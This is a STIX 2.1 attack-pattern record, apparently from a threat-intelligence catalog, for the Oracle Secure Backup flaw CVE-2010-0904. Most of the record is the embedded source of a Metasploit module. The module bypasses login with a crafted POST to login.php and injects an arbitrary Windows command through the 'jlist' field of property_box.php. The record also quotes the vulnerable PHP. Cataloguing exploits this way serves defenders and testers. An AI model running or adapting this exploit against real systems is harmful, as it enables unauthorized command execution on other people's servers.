{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--86146b1e-89bf-48e7-8309-0f94c9d3d29f",
    "created": "2024-08-14T16:22:52.289422Z",
    "modified": "2024-08-14T16:22:52.289426Z",
    "name": "Oracle Secure Backup Authentication Bypass/Command Injection Vulnerability",
    "description": " This module exploits an authentication bypass vulnerability in login.php in order to execute arbitrary code via a command injection vulnerability in property_box.php. This module was tested against Oracle Secure Backup version 10.3.0.1.0 (Win32). ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/oracle/osb_execqr3.rb",
            "external_id": "osb_execqr3.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-0904"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Oracle Secure Backup Authentication Bypass/Command Injection Vulnerability',\n      'Description'    => %q{\n          This module exploits an authentication bypass vulnerability\n        in login.php in order to execute arbitrary code via a command injection\n        vulnerability in property_box.php. This module was tested\n        against Oracle Secure Backup version 10.3.0.1.0 (Win32).\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2010-0904' ],\n          [ 'OSVDB', '66338'],\n          [ 'ZDI', '10-118' ],\n        ],\n      'DisclosureDate' => '2010-07-13'))\n\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptString.new('CMD', [ false, \"The command to execute.\", \"cmd.exe /c echo metasploit > %SYSTEMDRIVE%\\\\metasploit.txt\" ]),\n        OptBool.new('SSL',   [true, 'Use SSL', true]),\n      ])\n  end\n\n  def run\n    cmd = datastore['CMD']\n\n    res = send_request_cgi(\n      {\n        'uri'\t=>  '/login.php',\n        'data'\t=>  'attempt=1&uname=-',\n        'method' => 'POST',\n      }, 5)\n\n      if res && res.get_cookies.match(/PHPSESSID=(.*);(.*)/i)\n\n          print_status(\"Sending command: #{datastore['CMD']}...\")\n\n          send_request_cgi(\n            {\n              'uri'\t=> '/property_box.php',\n              'data'  => 'type=Job&jlist=' + Rex::Text.uri_encode('&' + cmd),\n              'cookie' => res.get_cookies,\n              'method' => 'POST',\n            }, 5)\n\n        print_status(\"Done.\")\n      else\n        print_error(\"Invalid PHPSESSION token..\")\n        return\n      end\n  end\nend\n=begin\n  else if (strcmp($type, \"Job\") == 0)\n    {\n    if (!is_array($objectname))\n      $objectname = array();\n    reset($objectname);\n    while (list(,$oname) = each($objectname))\n      {\n      $oname = escapeshellarg($oname);\n      $jlist = \"$jlist $oname\";\n      }\n    if (strlen($jlist) > 0)\n      $msg = exec_qr(\"$rbtool lsjob -lrRLC $jlist\");\n=end\n",
    "x_mitre_disclosure_date": "2010-07-13"
}